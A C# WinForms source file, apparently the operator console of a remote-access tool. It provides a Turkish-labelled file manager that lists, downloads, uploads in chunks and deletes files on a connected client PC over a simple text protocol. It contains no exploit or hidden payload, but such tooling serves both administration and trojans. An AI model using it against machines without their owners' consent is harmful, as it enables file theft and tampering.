// Dosya: Modules/FileManagerForm.cs
//using App.Service.Modules;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Windows.Forms;

namespace App.Service
{
    public class FileManagerForm : ModuleForm, IRemoteModule
    {
        ListView _list;
        TextBox _path;
        Label _info;
        Action<string> _send;
        string _cwd = "C:\\";
        ImageList _icons;

        public FileManagerForm() : base("Dosyalar")
        {
            Size = new Size(920, 640);

            _icons = BuildIcons();

            var top = new BufferedPanel { Height = S(40), Dock = DockStyle.Top, BackColor = Theme.Current.Side, Padding = new Padding(S(6)), Tag = "side" };

            var back = MkBtn("⬅", S(40));
            back.Click += (s, e) =>
            {
                try
                {
                    string p = Path.GetDirectoryName(_cwd.TrimEnd('\\'));
                    if (!string.IsNullOrEmpty(p)) Navigate(p);
                }
                catch { }
            };

            var refresh = MkBtn("⟳", S(40));
            refresh.Click += (s, e) => Navigate(_cwd);

            _path = new TextBox { Dock = DockStyle.Fill, BackColor = Theme.Current.InputBack, ForeColor = Theme.Current.InputFore, BorderStyle = BorderStyle.None, Font = Ui.F(8.5f) };
            _path.KeyDown += (s, e) => { if (e.KeyCode == Keys.Enter) { e.SuppressKeyPress = true; Navigate(_path.Text); } };

            top.Controls.Add(_path);
            top.Controls.Add(refresh);
            top.Controls.Add(back);

            _list = new BufferedListView
            {
                Dock = DockStyle.Fill,
                View = View.Details,
                FullRowSelect = true,
                MultiSelect = true,
                BackColor = Theme.Current.Main,
                ForeColor = Theme.Current.Text,
                BorderStyle = BorderStyle.None,
                SmallImageList = _icons,
                Font = Ui.F(8.5f),
                AllowDrop = true
            };
            _list.Columns.Add("Ad", S(392));
            _list.Columns.Add("Tarih", S(150));
            _list.Columns.Add("Boyut", S(120));

            _list.DoubleClick += (s, e) =>
            {
                if (_list.SelectedItems.Count == 0) return;
                var it = _list.SelectedItems[0];
                if (it.ImageKey == "dir") Navigate(_cwd.TrimEnd('\\') + "\\" + it.Text);
            };

            _list.DragEnter += (s, e) =>
            {
                if (e.Data.GetDataPresent(DataFormats.FileDrop))
                {
                    e.Effect = DragDropEffects.Copy;
                    _list.BackColor = Ui.Mix(Theme.Current.Main, Theme.Current.Accent, 0.22);
                }
                else e.Effect = DragDropEffects.None;
            };
            _list.DragLeave += (s, e) => _list.BackColor = Theme.Current.Main;
            _list.DragDrop += (s, e) =>
            {
                _list.BackColor = Theme.Current.Main;
                var files = e.Data.GetData(DataFormats.FileDrop) as string[];
                if (files != null && files.Length > 0) UploadAll(files);
            };

            var bottom = new BufferedPanel { Height = S(48), Dock = DockStyle.Bottom, BackColor = Theme.Current.Side, Tag = "side" };

            var dl = MkBtn("İndir", S(88));
            dl.Location = new Point(S(8), S(9));
            dl.Click += (s, e) =>
            {
                if (_send == null) return;
                if (_list.SelectedItems.Count == 0 || _list.SelectedItems[0].ImageKey == "dir") return;
                _send("FILE|GET|" + _cwd.TrimEnd('\\') + "\\" + _list.SelectedItems[0].Text);
            };

            var ul = MkBtn("Yükle", S(88));
            ul.Location = new Point(S(100), S(9));
            ul.Click += (s, e) =>
            {
                if (_send == null) return;
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Multiselect = true;
                    if (ofd.ShowDialog() != DialogResult.OK) return;
                    UploadAll(ofd.FileNames);
                }
            };

            var md = MkBtn("Klasör", S(88));
            md.Location = new Point(S(192), S(9));
            md.Click += (s, e) =>
            {
                if (_send == null) return;
                string name = Input("Yeni klasör adı:", "Yeni Klasör");
                if (string.IsNullOrWhiteSpace(name)) return;
                _send("FILE|MD|" + _cwd.TrimEnd('\\') + "\\" + name);
            };

            var del = MkBtn("Sil", S(88));
            del.Location = new Point(S(284), S(9));
            del.Palette(Theme.Current.Bad, Color.White);
            del.Click += (s, e) =>
            {
                if (_send == null) return;
                if (_list.SelectedItems.Count == 0) return;
                string full = _cwd.TrimEnd('\\') + "\\" + _list.SelectedItems[0].Text;
                if (MessageBox.Show(full + "\n\nSilinsin mi?", "Onay", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                    _send("FILE|DEL|" + full);
            };

            bottom.Controls.Add(dl);
            bottom.Controls.Add(ul);
            bottom.Controls.Add(md);
            bottom.Controls.Add(del);

            _info = new Label
            {
                Dock = DockStyle.Bottom,
                Height = S(24),
                TextAlign = ContentAlignment.MiddleLeft,
                Padding = new Padding(S(12), 0, 0, 0),
                ForeColor = Theme.Current.Muted,
                BackColor = Theme.Current.Side,
                Font = Ui.F(8f),
                Text = ""
            };

            Body.Controls.Add(_list);
            Body.Controls.Add(_info);
            Body.Controls.Add(bottom);
            Body.Controls.Add(top);
        }

        void UploadAll(string[] files)
        {
            if (_send == null) return;
            foreach (var f in files)
            {
                try
                {
                    string target = _cwd.TrimEnd('\\') + "\\" + Path.GetFileName(f);
                    var fi = new FileInfo(f);
                    if (fi.Length > 10L * 1024 * 1024) ChunkUpload(f, target);
                    else _send("FILE|PUT|" + target + "|" + Convert.ToBase64String(File.ReadAllBytes(f)));
                    Notify("Yükleniyor: " + Path.GetFileName(f));
                }
                catch (Exception ex) { Notify("Hata: " + ex.Message); }
            }
        }

        void ChunkUpload(string src, string target)
        {
            const int CH = 1024 * 1024;
            var fi = new FileInfo(src);
            int total = (int)((fi.Length + CH - 1) / CH);
            if (total < 1) total = 1;
            using (var fs = File.OpenRead(src))
            {
                byte[] buf = new byte[CH];
                for (int i = 0; i < total; i++)
                {
                    int n = fs.Read(buf, 0, CH);
                    if (n <= 0) n = 0;
                    byte[] part = new byte[n];
                    Buffer.BlockCopy(buf, 0, part, 0, n);
                    _send("FILE|PUT_CHUNK|" + target + "|" + i + "|" + total + "|" + Convert.ToBase64String(part));
                }
            }
        }

        static ImageList BuildIcons()
        {
            var il = new ImageList { ImageSize = new Size(18, 22), ColorDepth = ColorDepth.Depth32Bit };
            il.Images.Add("dir", MakeIcon("📁", Color.FromArgb(240, 196, 88)));
            il.Images.Add("exe", MakeIcon("⚙", Color.FromArgb(120, 210, 140)));
            il.Images.Add("img", MakeIcon("▣", Color.FromArgb(190, 140, 240)));
            il.Images.Add("txt", MakeIcon("≡", Color.FromArgb(120, 170, 240)));
            il.Images.Add("zip", MakeIcon("▤", Color.FromArgb(230, 176, 88)));
            il.Images.Add("file", MakeIcon("•", Color.FromArgb(150, 156, 168)));
            return il;
        }

        static Bitmap MakeIcon(string glyph, Color color)
        {
            var bmp = new Bitmap(18, 22);
            using (var g = Graphics.FromImage(bmp))
            {
                g.SmoothingMode = SmoothingMode.AntiAlias;
                g.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
                using (var p = Ui.Round(new Rectangle(0, 2, 17, 17), 4))
                using (var b = new SolidBrush(Color.FromArgb(46, color)))
                    g.FillPath(b, p);
                using (var b = new SolidBrush(color))
                using (var sf = new StringFormat { Alignment = StringAlignment.Center, LineAlignment = StringAlignment.Center })
                    g.DrawString(glyph, Ui.F(8f, FontStyle.Bold), b, new RectangleF(0, 2, 18, 18), sf);
            }
            return bmp;
        }

        static string KindOf(string name)
        {
            string e = (Path.GetExtension(name) ?? "").ToLowerInvariant();
            if (e == ".exe" || e == ".msi" || e == ".bat" || e == ".cmd" || e == ".ps1") return "exe";
            if (e == ".png" || e == ".jpg" || e == ".jpeg" || e == ".gif" || e == ".bmp" || e == ".webp") return "img";
            if (e == ".txt" || e == ".log" || e == ".ini" || e == ".cfg" || e == ".json" || e == ".xml") return "txt";
            if (e == ".zip" || e == ".rar" || e == ".7z" || e == ".gz") return "zip";
            return "file";
        }

        PillButton MkBtn(string t, int w)
        {
            var b = new PillButton { Text = t, Width = w, Height = S(30), Radius = 6, Font = Ui.F(8f) };
            b.Palette(Theme.Current.Card, Theme.Current.Text);
            return b;
        }

        string Input(string label, string def)
        {
            using (var f = new Form())
            {
                f.Text = "Girdi";
                f.Size = new Size(400, 144);
                f.FormBorderStyle = FormBorderStyle.FixedDialog;
                f.StartPosition = FormStartPosition.CenterParent;
                f.BackColor = Theme.Current.Main;
                f.ForeColor = Theme.Current.Text;
                f.Font = Ui.F(9f);

                var l = new Label { Text = label, Left = 16, Top = 14, AutoSize = true };
                var t = new TextBox { Left = 16, Top = 38, Width = 352, Text = def, BackColor = Theme.Current.InputBack, ForeColor = Theme.Current.InputFore };
                var ok = new PillButton { Text = "Tamam", Left = 264, Width = 104, Top = 72, DialogResult = DialogResult.OK, Radius = 6 };
                ok.Palette(Theme.Current.Accent, Color.White);

                f.Controls.Add(l);
                f.Controls.Add(t);
                f.Controls.Add(ok);
                f.AcceptButton = ok;

                return f.ShowDialog() == DialogResult.OK ? t.Text : null;
            }
        }

        void Navigate(string path)
        {
            if (_send == null) return;
            _cwd = path;
            _path.Text = path;
            _send("FILE|LIST|" + path);
        }

        public void Initialize(ClientSession s, Action<string> send)
        {
            _send = send;
            Title.Text = "Dosyalar - " + s.UserPc;
            Shown += (e, a) => Navigate("C:\\");
        }

        public void Notify(string text)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { Notify(text); }); } catch { } return; }
            _info.Text = text;
        }

        public void RefreshList()
        {
            if (IsDisposed) return;
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { RefreshList(); }); } catch { } return; }
            if (_send != null) _send("FILE|LIST|" + _cwd);
        }

        public void UpdateFiles(string data)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { UpdateFiles(data); }); } catch { } return; }
            _list.BeginUpdate();
            _list.Items.Clear();
            if (data.StartsWith("ERROR|")) { _list.EndUpdate(); _info.Text = data.Substring(6); return; }
            foreach (string row in data.Split(new[] { '|' }, StringSplitOptions.RemoveEmptyEntries))
            {
                string[] p = row.Split('~');
                if (p.Length < 4) continue;
                bool isDir = p[0] == "D";
                var lvi = new ListViewItem(p[1], isDir ? "dir" : KindOf(p[1]));
                lvi.SubItems.Add(p[2]);
                lvi.SubItems.Add(p[3] == "0" ? "" : p[3]);
                _list.Items.Add(lvi);
            }
            _list.EndUpdate();
            _info.Text = _list.Items.Count + " öğe";
        }

        public void SaveDownload(string name, string b64)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { SaveDownload(name, b64); }); } catch { } return; }
            using (var sfd = new SaveFileDialog { FileName = name })
            {
                if (sfd.ShowDialog() != DialogResult.OK) return;
                try
                {
                    File.WriteAllBytes(sfd.FileName, Convert.FromBase64String(b64));
                    _info.Text = "Kaydedildi: " + sfd.FileName;
                }
                catch (Exception ex) { MessageBox.Show(ex.Message, "Hata"); }
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && _icons != null) { _icons.Dispose(); _icons = null; }
            base.Dispose(disposing);
        }
    }
}